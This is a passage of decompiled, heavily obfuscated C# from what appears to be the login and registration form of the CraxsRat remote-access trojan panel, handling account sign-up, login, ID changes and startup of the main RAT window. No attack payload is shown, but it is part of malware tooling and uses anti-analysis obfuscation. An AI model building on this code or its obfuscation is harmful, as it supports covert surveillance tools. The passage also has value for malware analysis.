        Process.Start(EXGuarder.\u0033A50571D);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
label_2:
        int num1 = -1122310185;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) -(~~1256575749 - ((1496640169 ^ 1199082756) + 503797284 * 1660273173) - (num2 * 1490721011 ^ -(--385974090 - -1811783639 - 1519873683)))) % 3U)
          {
            case 0:
              goto label_2;
            case 1:
              goto label_4;
            case 2:
              ProjectData.ClearProjectError();
              num1 = (int) num3 * 1445813246 ^ -1679060982;
              continue;
            default:
              goto label_6;
          }
        }
label_4:
        return;
label_6:;
      }
    }

    private void Ports_FormClosing(object sender, FormClosingEventArgs e)
    {
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
label_0:
      int num1 = -833949750;
      bool flag;
      bool finish;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ~(((num1 + (~~(-2079413083 * 882611345 ^ 1596560029 - 778267613) ^ -1670873114 * -736437143 - 324678079 + (~988856646 + 1208377682) ^ --(1625079040 - 1493079619))) * -2132114859 * 690440715 + 738134748) * 1193675039)) % 29U)
        {
          case 0:
            this.statuslabel.Text = this.statuslabel.Text.Replace(EXGuarder.\u00378776D01, EXGuarder.\u0036526413F);
            // ISSUE: variable of a reference type
            int& local1;
            // ISSUE: explicit reference operation
            int num3 = checked (^(local1 = ref ((SpySettings) this).index) - 3);
            local1 = num3;
            num1 = (int) num2 * -104260764 ^ 1537052671;
            continue;
          case 1:
            int num4 = !finish ? -1349049924 : (num4 = -986833208);
            num1 = num4 ^ (int) num2 * 440268048;
            continue;
          case 2:
            num1 = (int) num2 * 441184058 ^ 102235667;
            continue;
          case 3:
            num1 = (int) num2 * 289564567 ^ -308437112;
            continue;
          case 4:
            flag = !((SpySettings) this).S;
            num1 = (int) num2 * 1092286926 ^ -2145601872;
            continue;
          case 5:
            ((SpySettings) this).S = true;
            num1 = (int) num2 * 974927698 ^ 290532411;
            continue;
          case 6:
            num1 = 1266470963;
            continue;
          case 7:
            this.Timer1.Stop();
            num1 = (int) num2 * 838182473 ^ 1348787621;
            continue;
          case 8:
            num1 = (int) num2 * 1377237858 ^ -1832637098;
            continue;
          case 9:
            goto label_2;
          case 10:
            num1 = (int) num2 * 500949142 ^ 203139444;
            continue;
          case 11:
            goto label_0;
          case 12:
            num1 = (int) num2 * -1954097609 ^ 365857418;
            continue;
          case 13:
            num1 = (int) num2 * -109360481 ^ -130415733;
            continue;
          case 14:
            Label statuslabel;
            string str = (statuslabel = this.statuslabel).Text + ((SpySettings) this).holder.Replace(EXGuarder.\u00378776D01, EXGuarder.\u0036526413F);
            statuslabel.Text = str;
            num1 = -678730453;
            continue;
          case 15:
            MyProject.Forms.CraxsRatMain.Timer1.Enabled = true;
            num1 = (int) num2 * 1936657318 ^ -941462095;
            continue;
          case 16:
            this.Close();
            num1 = (int) num2 * -268322348 ^ 1914915715;
            continue;
          case 17:
            num1 = (int) num2 * -1488883872 ^ 1859119106;
            continue;
          case 18:
            num1 = 1079717254;
            continue;
          case 19:
            num1 = -1882783888;
            continue;
          case 20:
            finish = ((SpySettings) this).Finish;
            num1 = (int) num2 * 1661712359 ^ -371064047;
            continue;
          case 21:
            this.loadingimage.Enabled = false;
            num1 = (int) num2 * -1981724282 ^ -1324336507;
            continue;
          case 22:
            int num5 = this.statuslabel.Text.Length >= ((SpySettings) this).holder.Length ? -213502443 : (num5 = -762661376);
            num1 = num5 ^ (int) num2 * 1738112824;
            continue;
          case 23:
            num1 = (int) num2 * -813995814 ^ -731049436;
            continue;
          case 24:
            this.DialogResult = DialogResult.OK;
            num1 = (int) num2 * 424559482 ^ -1189621668;
            continue;
          case 25:
            int num6 = !flag ? 221663229 : (num6 = 768522925);
            num1 = num6 ^ (int) num2 * -1703500300;
            continue;
          case 26:
            // ISSUE: variable of a reference type
            int& local2;
            // ISSUE: explicit reference operation
            int num7 = checked (^(local2 = ref ((SpySettings) this).index) + 1);
            local2 = num7;
            num1 = (int) num2 * 256779410 ^ 2048361553;
            continue;
          case 27:
            MyProject.Forms.CraxsRatMain.StartWorkercheck();
            num1 = (int) num2 * -1357429526 ^ -933544375;
            continue;
          case 28:
            num1 = (int) num2 * -1022223257 ^ 488654235;
            continue;
          default:
            goto label_30;
        }
      }
label_2:
      return;
label_30:;
    }

    private void Statuslabel_Click(object sender, EventArgs e)
    {
    }

    private void Label1_MouseDown(object sender, MouseEventArgs e)
    {
      if (e.Button != MouseButtons.Left)
        return;
label_1:
      int num1 = -4576321;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (((num1 * 1026558983 - (~((1067107994 ^ 109877365) + 1290312532) - (~-1769262545 * -43946993 - (-360356769 ^ 1104488331 ^ 1050335560))) + 1000145195 * (~377651424 ^ ~-413243159)) * -704939885 ^ 1041477616 - 100025466) * 1319744305)) % 3U)
        {
          case 0:
            goto label_5;
          case 1:
            Codes.ReleaseCapture();
            Codes.SendMessage(this.Handle, 161, 2, 0);
            num1 = (int) num2 * -2005453904 ^ -603576778;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_6;
        }
      }
label_5:
      return;
label_6:;
    }

    private void PictureBox2_MouseDown(object sender, MouseEventArgs e)
    {
      if (e.Button != MouseButtons.Left)
        return;
label_1:
      int num1 = 1061309153;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ~-~(-(num1 - ~--1175887063) - (~(29294383 * -1492144951) - (--1664969238 - 1869142172)))) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            Codes.ReleaseCapture();
            num1 = (int) num2 * -734400326 ^ 188166581;
            continue;
          case 2:
            goto label_6;
          case 3:
            Codes.SendMessage(this.Handle, 161, 2, 0);
            num1 = (int) num2 * -1878606791 ^ -561137067;
            continue;
          default:
            goto label_7;
        }
      }
label_6:
      return;
label_7:;
    }

    private void Panel3_MouseDown(object sender, MouseEventArgs e)
    {
      if (e.Button != MouseButtons.Left)
        return;
label_1:
      int num1 = 1299673849;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) -(--(~num1 + -870211026) - 788067133 * 1351354401)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            Codes.ReleaseCapture();
            num1 = (int) num2 * 1191686840 ^ 84049139;
            continue;
          case 2:
            goto label_6;
          case 3:
            Codes.SendMessage(this.Handle, 161, 2, 0);
            num1 = (int) num2 * 1229088499 ^ 1096169415;
            continue;
          default:
            goto label_7;
        }
      }
label_6:
      return;
label_7:;
    }

    private void Porttext_KeyPress(object sender, KeyPressEventArgs e)
    {
    }

    private void Porttext_TextChanged(object sender, EventArgs e)
    {
    }

    private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
    {
      if (e.Button != MouseButtons.Left)
        return;
label_1:
      int num1 = 314106521;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) ~((-1642336528 - -~758702421 ^ ~(924106568 - ~-772537389)) - -num2)) % 4U)
        {
          case 0:
            Codes.SendMessage(this.Handle, 161, 2, 0);
            num1 = (int) num3 * 1766384551 ^ -513094632;
            continue;
          case 1:
            Codes.ReleaseCapture();
            num1 = (int) num3 * -872147031 ^ 1685176155;
            continue;
          case 2:
            goto label_6;
          case 3:
            goto label_1;
          default:
            goto label_7;
        }
      }
label_6:
      return;
label_7:;
    }

    private void DrakeUIButtonIcon1_Click_1(object sender, EventArgs e)
    {
      this.DialogResult = DialogResult.No;
      this.Close();
    }

    private void DrakeUILinkLabel1_Click_2(object sender, EventArgs e)
    {
      Process.Start(EXGuarder.\u0033C49120B);
    }

    private void Usrkeytext_MouseEnter(object sender, EventArgs e)
    {
      this.usrkeytext.PasswordChar = char.MinValue;
    }

    private void Usrkeytext_MouseLeave(object sender, EventArgs e)
    {
      this.usrkeytext.PasswordChar = '•';
    }

    private void PictureBox1_MouseDown_1(object sender, MouseEventArgs e)
    {
      if (e.Button != MouseButtons.Left)
        return;
label_1:
      int num1 = -1171238539;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((num1 + (~(291753945 * ~1571523057 + (-1905746925 * -1556050021 + -400638958)) + (~~~1329122135 ^ -(-1906241979 - 1807269222 + ~-1512790056))) ^ ~229922970 ^ ~(560456253 - 1012324336) ^ -873265288 - 2079625916 + 1550693502 ^ -1695093383 * (-1816968641 - -1979162349)) - -1180663540 - 1361637732)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_5;
          case 2:
            Codes.ReleaseCapture();
            Codes.SendMessage(this.Handle, 161, 2, 0);
            num1 = (int) num2 * -566391349 ^ 2058399224;
            continue;
          default:
            goto label_6;
        }
      }
label_5:
      return;
label_6:;
    }

    private void DrakeUILinkLabel2_Click(object sender, EventArgs e)
    {
    }

    private void welclabel_Click(object sender, EventArgs e)
    {
    }

    private void DrakeUIButtonIcon1_Click_2(object sender, EventArgs e)
    {
    }

    private void b_ok_Click(object sender, EventArgs e)
    {
      this.DialogResult = DialogResult.OK;
label_1:
      int num1 = 2131114235;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) (1009675874 - -1670503891 - --1219322018 - (~~num2 + 2066737292))) % 6U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_3;
          case 2:
            goto label_7;
          case 3:
            this.loadingimage.Visible = true;
            num1 = -1853338836;
            continue;
          case 4:
            int num4 = !this.loginworker.IsBusy ? 430234384 : (num4 = 41450121);
            num1 = num4 ^ (int) num3 * 1001600749;
            continue;
          case 5:
            this.loginbtn.Enabled = false;
            this.loginworker.RunWorkerAsync();
            num1 = (int) num3 * -1022608314 ^ -2003633304;
            continue;
          default:
            goto label_8;
        }
      }
label_3:
      return;
label_8:
      return;
label_7:
      CraxsAlert.Showinformation(Codes.AES_Decrypt(EXGuarder.\u0033D205C3A, EXGuarder.\u0030E023169));
    }

    private void b_reg_Click(object sender, EventArgs e)
    {
label_0:
      int num1 = -1867068553;
      while (true)
      {
        int num2 = num1;
        uint num3;
        bool isBusy;
        switch ((num3 = (uint) -(1693784386 * 2111869533 - 448931408 + ((--872645535 ^ 2054159521 - 593680880) - ~(-1358045958 - -886051316)) - (num2 ^ -~(-1230761360 - 2045276087 + (-2122802674 ^ -132366645)) + (1538569197 * 233627574 + (-2129777262 ^ -562177752 - 50102136) + (292515696 - (-1313135971 ^ -1461544967) ^ -885436922))))) % 12U)
        {
          case 0:
            num1 = (int) num3 * -1383370821 ^ 2098490698;
            continue;
          case 1:
            num1 = (int) num3 * 797574795 ^ -591220502;
            continue;
          case 2:
            goto label_0;
          case 3:
            num1 = (int) num3 * 64088504 ^ 558448985;
            continue;
          case 4:
            CraxsAlert.Showinformation(Codes.AES_Decrypt(EXGuarder.\u00339543E2C, EXGuarder.\u003722A6974));
            num1 = (int) num3 * -419023890 ^ 1229627018;
            continue;
          case 5:
            this.regworker.RunWorkerAsync();
            num1 = (int) num3 * 2000145342 ^ 637537909;
            continue;
          case 6:
            this.loadingimageR.Visible = true;
            num1 = -97305825;
            continue;
          case 7:
            num1 = (int) num3 * -751371665 ^ 284695731;
            continue;
          case 8:
            goto label_2;
          case 9:
            this.regbtn.Enabled = false;
            num1 = (int) num3 * -467617365 ^ 1843388498;
            continue;
          case 10:
            int num4 = !isBusy ? -1312013178 : (num4 = -648001856);
            num1 = num4 ^ (int) num3 * 52112335;
            continue;
          case 11:
            isBusy = this.regworker.IsBusy;
            num1 = (int) num3 * 923835174 ^ -1399607130;
            continue;
          default:
            goto label_13;
        }
      }
label_2:
      return;
label_13:;
    }

    private void CHIDbtn_Click(object sender, EventArgs e)
    {
      if (!this.changeIDWorker.IsBusy)
        goto label_6;
label_1:
      int num1 = -107029351;
label_2:
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) ((-~((~(975432917 * -193788375) - num2) * -1089477073) ^ -2123524472) * -299654385)) % 10U)
        {
          case 0:
            num1 = (int) num3 * -2084324830 ^ -127030477;
            continue;
          case 1:
            goto label_6;
          case 2:
            num1 = (int) num3 * 465339220 ^ 1660317512;
            continue;
          case 3:
            this.changeIDWorker.RunWorkerAsync();
            num1 = (int) num3 * -513249924 ^ 254615077;
            continue;
          case 4:
            CraxsAlert.Showinformation(Codes.AES_Decrypt(EXGuarder.\u003434D6155, EXGuarder.\u003383A7543));
            num1 = (int) num3 * -1852015473 ^ 118243481;
            continue;
          case 5:
            this.CHIDbtn.Enabled = false;
            num1 = (int) num3 * -96186593 ^ 325676927;
            continue;
          case 6:
            goto label_3;
          case 7:
            num1 = (int) num3 * 1512917399 ^ -1910700428;
            continue;
          case 8:
            this.CHIDimg.Visible = true;
            num1 = (int) num3 * 2020229443 ^ 727766882;
            continue;
          case 9:
            goto label_1;
          default:
            goto label_12;
        }
      }
label_3:
      return;
label_12:
      return;
label_6:
      num1 = 1169472617;
      goto label_2;
    }

    private void changeIDWorker_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
    {
      this.CHIDimg.Visible = false;
label_1:
      int num1 = -2045798119;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) (~(-1995174568 ^ -1143885254) - (186299892 - -1632809917 - 1579028814) - (~num2 + -(1664316248 ^ -1268953251 ^ ~-73518426) * 788660823) - (-1537909841 * -1372196915 + (1018772864 - 819866953)) + (-44435113 ^ 755590867))) % 5U)
        {
          case 0:
            goto label_1;
          case 1:
            this.CHIDpassword.Text = EXGuarder.\u003382A1A58;
            num1 = (int) num3 * -448278973 ^ -972767481;
            continue;
          case 2:
            goto label_3;
          case 3:
            this.CHIDaccount.Text = EXGuarder.\u003382A1A58;
            num1 = (int) num3 * -1243039753 ^ -697540351;
            continue;
          case 4:
            this.CHIDbtn.Enabled = true;
            num1 = (int) num3 * 1427334949 ^ 1260110798;
            continue;
          default:
            goto label_7;
        }
      }
label_3:
      return;
label_7:;
    }

    private void regworker_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
    {
      this.loadingimageR.Visible = false;
label_1:
      int num1 = -962138299;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) (-(-1034634190 - ~num2 * -442548547 ^ -1570414201) ^ 365377220)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            this.regbtn.Enabled = true;
            num1 = (int) num3 * 1606065605 ^ 106999939;
            continue;
          case 2:
            this.usremailtextreg.Text = EXGuarder.\u00305231063;
            this.usrkeyreg.Text = EXGuarder.\u00305231063;
            this.keyText.Text = EXGuarder.\u00305231063;
            num1 = (int) num3 * 938926715 ^ -837194243;
            continue;
          case 3:
            goto label_3;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:;
    }

    private void loginworker_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
    {
      this.loadingimage.Visible = false;
      this.loginbtn.Enabled = true;
    }

    private void Regworker_DoWork(object sender, DoWorkEventArgs e)
    {
      try
      {
label_1:
        int num1 = 349122094;
        bool flag1;
        bool flag2;
        // ISSUE: variable of a compiler-generated type
        Ports._Closure\u0024__227\u002D0 TargetObject;
        bool flag3;
        bool flag4;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (-(num1 - (~~(1176223373 * 249858839 * 1277120773) - -444095869 * 1826450205) + (1224360989 - ~(-1945223456 ^ 1866649592) - ~-(-2021383485 * 1292477581))) - -1568786227 * (1992052497 - 1286561613))) % 30U)
          {
            case 0:
              object method1;
              if (SpySettings.\u0024I227\u002D2 != null)
              {
                method1 = (object) SpySettings.\u0024I227\u002D2;
              }
              else
              {
                // ISSUE: method pointer
                SpySettings.\u0024I227\u002D2 = (VB\u0024AnonymousDelegate_0) (method1 = (object) new EXGuarder((object) SpySettings.\u0024I, __methodptr(_Lambda\u0024__227\u002D2)));
              }
              this.Invoke((Delegate) method1);
              num1 = -529686145;
              continue;
            case 1:
              int num3 = !flag2 ? -34158045 : (num3 = 577568309);
              num1 = num3 ^ (int) num2 * 1846584835;
              continue;
            case 2:
              object method2;
              if (SpySettings.\u0024I227\u002D4 != null)
              {
                method2 = (object) SpySettings.\u0024I227\u002D4;
              }
              else
              {
                // ISSUE: method pointer
                SpySettings.\u0024I227\u002D4 = (VB\u0024AnonymousDelegate_0) (method2 = (object) new EXGuarder((object) SpySettings.\u0024I, __methodptr(_Lambda\u0024__227\u002D4)));
              }
              this.Invoke((Delegate) method2);
              num1 = 97275982;
              continue;
            case 3:
              goto label_8;
            case 4:
              // ISSUE: object of a compiler-generated type is created
              TargetObject = (Ports._Closure\u0024__227\u002D0) new Ports.VB\u0024StateMachine_174_FadeIn();
              num1 = (int) num2 * 1266703969 ^ 685944809;
              continue;
            case 5:
              ((SpySettings) TargetObject).\u0024VB\u0024Local_re = Codes.ApiReg(this.usremailtextreg.Text, this.usrkeyreg.Text, this.keyText.Text);
              num1 = -762633179;
              continue;
            case 6:
              int num4 = Regex.IsMatch(this.keyText.Text, EXGuarder.\u00339136C59) ? 1665351251 : (num4 = 1640546750);
              num1 = num4 ^ (int) num2 * 779454403;
              continue;
            case 8:
              flag1 = string.IsNullOrEmpty(this.usremailtextreg.Text);
              num1 = (int) num2 * -62616537 ^ 2074509720;
              continue;
            case 9:
              goto label_1;
            case 10:
              num1 = -867360882;
              continue;
            case 11:
              flag4 = !Regex.IsMatch(this.usremailtextreg.Text, EXGuarder.\u00339136C59);
              num1 = -43412141;
              continue;
            case 12:
              int num5 = !flag3 ? 1397305967 : (num5 = -82644797);
              num1 = num5 ^ (int) num2 * 1682019842;
              continue;
            case 13:
              num1 = -1171956771;
              continue;
            case 14:
              object method3;
              if (SpySettings.\u0024I227\u002D5 != null)
              {
                method3 = (object) SpySettings.\u0024I227\u002D5;
              }
              else
              {
                // ISSUE: method pointer
                SpySettings.\u0024I227\u002D5 = (VB\u0024AnonymousDelegate_0) (method3 = (object) new EXGuarder((object) SpySettings.\u0024I, __methodptr(_Lambda\u0024__227\u002D5)));
              }
              this.Invoke((Delegate) method3);
              num1 = -583791676;
              continue;
            case 15:
              goto label_3;
            case 16:
              goto label_60;
            case 17:
              object method4;
              if (SpySettings.\u0024I227\u002D3 != null)
              {
                method4 = (object) SpySettings.\u0024I227\u002D3;
              }
              else
              {
                // ISSUE: method pointer
                SpySettings.\u0024I227\u002D3 = (VB\u0024AnonymousDelegate_0) (method4 = (object) new EXGuarder((object) SpySettings.\u0024I, __methodptr(_Lambda\u0024__227\u002D3)));
              }
              this.Invoke((Delegate) method4);
              num1 = -346630417;
              continue;
            case 18:
              num1 = -771184558;
              continue;
            case 19:
              int num6 = !flag4 ? 1830550739 : (num6 = 907900782);
              num1 = num6 ^ (int) num2 * 1714983632;
              continue;
            case 20:
              int num7 = !(string.IsNullOrEmpty(this.usrkeyreg.Text) | string.IsNullOrWhiteSpace(this.usrkeyreg.Text)) ? -1583752585 : (num7 = -2050277412);
              num1 = num7 ^ (int) num2 * 1910541875;
              continue;
            case 21:
              int num8 = Operators.CompareString(this.regbtn.Text, EXGuarder.\u003301B2A73, false) != 0 ? 742166744 : (num8 = -1020722467);
              num1 = num8 ^ (int) num2 * 924095415;
              continue;
            case 22:
              goto label_16;
            case 23:
              num1 = 250409880;
              continue;
            case 24:
              goto label_61;
            case 25:
              goto label_32;
            case 26:
              int num9 = !flag1 ? 1757849032 : (num9 = -1504025173);
              num1 = num9 ^ (int) num2 * 303874137;
              continue;
            case 27:
              flag2 = !Regex.IsMatch(this.usrkeyreg.Text, EXGuarder.\u00339136C59);
              num1 = -1305695903;
              continue;
            case 28:
              goto label_20;
            case 29:
              flag3 = string.IsNullOrEmpty(this.keyText.Text);
              num1 = (int) num2 * 811644527 ^ 1559674861;
              continue;
            default:
              goto label_50;
          }
        }
label_8:
        return;
label_3:
        return;
label_60:
        return;
label_61:
        return;
label_16:
        object method5;
        if (SpySettings.\u0024I227\u002D6 != null)
        {
          method5 = (object) SpySettings.\u0024I227\u002D6;
        }
        else
        {
          // ISSUE: method pointer
          SpySettings.\u0024I227\u002D6 = (VB\u0024AnonymousDelegate_0) (method5 = (object) new EXGuarder((object) SpySettings.\u0024I, __methodptr(_Lambda\u0024__227\u002D6)));
        }
        this.Invoke((Delegate) method5);
        return;
label_20:
        object method6;
        if (SpySettings.\u0024I227\u002D0 != null)
        {
          method6 = (object) SpySettings.\u0024I227\u002D0;
        }
        else
        {
          // ISSUE: method pointer
          SpySettings.\u0024I227\u002D0 = (VB\u0024AnonymousDelegate_0) (method6 = (object) new EXGuarder((object) SpySettings.\u0024I, __methodptr(_Lambda\u0024__227\u002D0)));
        }
        this.Invoke((Delegate) method6);
        return;
label_32:
        object method7;
        if (SpySettings.\u0024I227\u002D1 != null)
        {
          method7 = (object) SpySettings.\u0024I227\u002D1;
        }
        else
        {
          // ISSUE: method pointer
          SpySettings.\u0024I227\u002D1 = (VB\u0024AnonymousDelegate_0) (method7 = (object) new EXGuarder((object) SpySettings.\u0024I, __methodptr(_Lambda\u0024__227\u002D1)));
        }
        this.Invoke((Delegate) method7);
        return;
label_50:
        // ISSUE: method pointer
        this.Invoke((Delegate) new EXGuarder((object) TargetObject, __methodptr(_Lambda\u0024__7)));
        return;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        // ISSUE: object of a compiler-generated type is created
        // ISSUE: variable of a compiler-generated type
        Ports._Closure\u0024__227\u002D1 TargetObject = (Ports._Closure\u0024__227\u002D1) new Ports._Closure\u0024__227\u002D0();
        Exception exception = ex;
label_52:
        int num10 = -466354723;
        while (true)
        {
          uint num11;
          switch ((num11 = (uint) (-(num10 - (~~(1176223373 * 249858839 * 1277120773) - -444095869 * 1826450205) + (1224360989 - ~(-1945223456 ^ 1866649592) - ~-(-2021383485 * 1292477581))) - -1568786227 * (1992052497 - 1286561613))) % 7U)
          {
            case 0:
              ProjectData.ClearProjectError();
              num10 = (int) num11 * -1686766126 ^ -375014367;
              continue;
            case 2:
              num10 = (int) num11 * 2013859544 ^ -693358318;
              continue;
            case 3:
              ((SpySettings) TargetObject).\u0024VB\u0024Local_ex = exception;
              num10 = (int) num11 * 613256542 ^ -757864705;
              continue;
            case 4:
              goto label_52;
            case 5:
              // ISSUE: method pointer
              this.Invoke((Delegate) new EXGuarder((object) TargetObject, __methodptr(_Lambda\u0024__8)));
              num10 = (int) num11 * -2110976509 ^ -664300592;
              continue;
            case 6:
              Environment.Exit(0);
              num10 = (int) num11 * -559202830 ^ 650342287;
              continue;
            default:
              goto label_59;
          }
        }
      }
label_59:;
    }

    private void changeIDWorker_DoWork(object sender, DoWorkEventArgs e)
    {
      try
      {
label_1:
        int num1 = 1548638630;
        // ISSUE: variable of a compiler-generated type
        Ports._Closure\u0024__228\u002D0 TargetObject;
        while (true)
        {
          int num2 = num1;
          uint num3;
          bool flag1;
          bool flag2;
          bool flag3;
          bool flag4;
          bool flag5;
          switch ((num3 = (uint) (450303268 - ((-num2 - (~-958489333 + 937393026) ^ --(742901436 ^ -1294049208) ^ (612433600 ^ 1954527735) - ~-1224853089) - (1979993183 + 1650480016)))) % 24U)
          {
            case 0:
              goto label_8;
            case 1:
              num1 = -1409367624;
              continue;
            case 2:
              flag4 = string.IsNullOrEmpty(this.CHIDaccount.Text);
              num1 = (int) num3 * 678616487 ^ 886951062;
              continue;
            case 3:
              goto label_46;
            case 4:
              // ISSUE: object of a compiler-generated type is created
              TargetObject = (Ports._Closure\u0024__228\u002D0) new Ports._Closure\u0024__();
              num1 = (int) num3 * -1659107310 ^ -854682767;
              continue;
            case 5:
              goto label_1;
            case 6:
              num1 = -1575896324;
              continue;
            case 7:
              int num4 = !flag2 ? 638335693 : (num4 = 210190882);
              num1 = num4 ^ (int) num3 * 390251880;
              continue;
            case 8:
              goto label_27;
            case 9:
              object method1;
              if (SpySettings.\u0024I228\u002D0 != null)
              {
                method1 = (object) SpySettings.\u0024I228\u002D0;
              }
              else
              {
                // ISSUE: method pointer
                SpySettings.\u0024I228\u002D0 = (VB\u0024AnonymousDelegate_0) (method1 = (object) new EXGuarder((object) SpySettings.\u0024I, __methodptr(_Lambda\u0024__228\u002D0)));
              }
              this.Invoke((Delegate) method1);
              num1 = 339433751;
              continue;
            case 10:
              int num5 = !flag3 ? 1454155432 : (num5 = -896618135);
              num1 = num5 ^ (int) num3 * 1595326553;
              continue;
            case 11:
              goto label_47;
            case 12:
              flag3 = !Regex.IsMatch(this.CHIDaccount.Text, EXGuarder.\u00369270965);
              num1 = (int) num3 * 683291150 ^ -1112242600;
              continue;
            case 13:
              int num6 = !flag1 ? 1013172264 : (num6 = 498754528);
              num1 = num6 ^ (int) num3 * -1180538803;
              continue;
            case 14:
              flag5 = string.IsNullOrEmpty(this.CHIDpassword.Text) | string.IsNullOrWhiteSpace(this.CHIDpassword.Text);
              num1 = (int) num3 * 298709827 ^ 117711492;
              continue;
            case 15:
              object method2;
              if (clrSAVE.\u0024I228\u002D3 != null)
              {
                method2 = (object) clrSAVE.\u0024I228\u002D3;
              }
              else
              {
                // ISSUE: method pointer
                clrSAVE.\u0024I228\u002D3 = (VB\u0024AnonymousDelegate_0) (method2 = (object) new EXGuarder((object) SpySettings.\u0024I, __methodptr(_Lambda\u0024__228\u002D3)));
              }
              this.Invoke((Delegate) method2);
              num1 = 652080759;
              continue;
            case 16:
              flag2 = !Regex.IsMatch(this.CHIDpassword.Text, EXGuarder.\u00369270965);
              num1 = 881794811;
              continue;
            case 17:
              flag1 = Operators.CompareString(this.CHIDbtn.Text, EXGuarder.\u00336620871, false) == 0;
              num1 = (int) num3 * 1599665109 ^ -1940754192;
              continue;
            case 18:
              int num7 = !flag4 ? -1359710908 : (num7 = 2086103903);
              num1 = num7 ^ (int) num3 * 440939992;
              continue;
            case 19:
              goto label_31;
            case 20:
              int num8 = !flag5 ? -1367207757 : (num8 = -486199390);
              num1 = num8 ^ (int) num3 * 1381190738;
              continue;
            case 21:
              num1 = 455157036;
              continue;
            case 23:
              num1 = 924341342;
              continue;
            default:
              goto label_38;
          }
        }
label_46:
        return;
label_47:
        return;
label_8:
        object method3;
        if (clrSAVE.\u0024I228\u002D2 != null)
        {
          method3 = (object) clrSAVE.\u0024I228\u002D2;
        }
        else
        {
          // ISSUE: method pointer
          clrSAVE.\u0024I228\u002D2 = (VB\u0024AnonymousDelegate_0) (method3 = (object) new EXGuarder((object) SpySettings.\u0024I, __methodptr(_Lambda\u0024__228\u002D2)));
        }
        this.Invoke((Delegate) method3);
        return;
label_27:
        object method4;
        if (Notif_Sound.\u0024I228\u002D4 != null)
        {
          method4 = (object) Notif_Sound.\u0024I228\u002D4;
        }
        else
        {
          // ISSUE: method pointer
          Notif_Sound.\u0024I228\u002D4 = (VB\u0024AnonymousDelegate_0) (method4 = (object) new EXGuarder((object) SpySettings.\u0024I, __methodptr(_Lambda\u0024__228\u002D4)));
        }
        this.Invoke((Delegate) method4);
        return;
label_31:
        object method5;
        if (SpySettings.\u0024I228\u002D1 != null)
        {
          method5 = (object) SpySettings.\u0024I228\u002D1;
        }
        else
        {
          // ISSUE: method pointer
          SpySettings.\u0024I228\u002D1 = (VB\u0024AnonymousDelegate_0) (method5 = (object) new EXGuarder((object) SpySettings.\u0024I, __methodptr(_Lambda\u0024__228\u002D1)));
        }
        this.Invoke((Delegate) method5);
        return;
label_38:
        ((MultiSounds) TargetObject).\u0024VB\u0024Local_re = Codes.ApiChangeID(this.CHIDaccount.Text, this.CHIDpassword.Text);
        // ISSUE: method pointer
        this.Invoke((Delegate) new EXGuarder((object) TargetObject, __methodptr(_Lambda\u0024__5)));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        // ISSUE: object of a compiler-generated type is created
        // ISSUE: variable of a compiler-generated type
        Ports._Closure\u0024__228\u002D1 TargetObject = (Ports._Closure\u0024__228\u002D1) new Ports._Closure\u0024__228\u002D0();
        Exception exception = ex;
        ((reso) TargetObject).\u0024VB\u0024Local_ex = exception;
label_40:
        int num9 = 1672274325;
        while (true)
        {
          int num10 = num9;
          uint num11;
          switch ((num11 = (uint) (450303268 - ((-num10 - (~-958489333 + 937393026) ^ --(742901436 ^ -1294049208) ^ (612433600 ^ 1954527735) - ~-1224853089) - (1979993183 + 1650480016)))) % 5U)
          {
            case 0:
              goto label_40;
            case 1:
              // ISSUE: method pointer
              this.Invoke((Delegate) new EXGuarder((object) TargetObject, __methodptr(_Lambda\u0024__6)));
              num9 = (int) num11 * 1441561105 ^ 1155163952;
              continue;
            case 3:
              Environment.Exit(0);
              num9 = (int) num11 * 587177581 ^ 103177866;
              continue;
            case 4:
              num9 = (int) num11 * 2132935267 ^ -667079916;
              continue;
            default:
              goto label_45;
          }
        }
label_45:
        ProjectData.ClearProjectError();
      }
    }

    private void Loginworker_DoWork(object sender, DoWorkEventArgs e)
    {
      try
      {
label_1:
        int num1 = -1361252812;
        bool flag1;
        bool flag2;
        // ISSUE: variable of a compiler-generated type
        Ports._Closure\u0024__229\u002D0 TargetObject;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((num1 ^ 1927074795 * 2045124796 * -7631975) - (18053834 - --(-406087461 * -808745950)) - -1204422693 * ((-355238271 ^ -1609503635) * -1480145559))) % 25U)
          {
            case 0:
              num1 = -1205571464;
              continue;
            case 1:
              goto label_43;
            case 2:
              // ISSUE: object of a compiler-generated type is created
              TargetObject = (Ports._Closure\u0024__229\u002D0) new Ports._Closure\u0024__228\u002D1();
              num1 = (int) num2 * 1446469659 ^ -284153793;
              continue;
            case 3:
              object method1;
              if (Notif_Sound.\u0024I229\u002D0 != null)
              {
                method1 = (object) Notif_Sound.\u0024I229\u002D0;
              }
              else
              {
                // ISSUE: method pointer
                Notif_Sound.\u0024I229\u002D0 = (VB\u0024AnonymousDelegate_0) (method1 = (object) new EXGuarder((object) SpySettings.\u0024I, __methodptr(_Lambda\u0024__229\u002D0)));
